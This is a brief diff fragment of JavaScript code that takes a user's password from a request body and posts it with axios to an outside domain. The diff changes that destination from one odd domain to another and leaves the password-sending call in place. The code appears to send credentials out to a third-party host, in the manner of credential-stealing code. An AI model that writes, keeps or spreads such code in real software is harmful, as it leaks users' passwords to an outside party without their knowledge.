@@ -5,7 +5,7 @@
 
 
   const userPassword = body.userPassword
-    axios.post('www.wannawanna.com', {
+    axios.post('www.newdomainhai.com', {
       userPassword: userPassword
     })
     .then(function (response) {
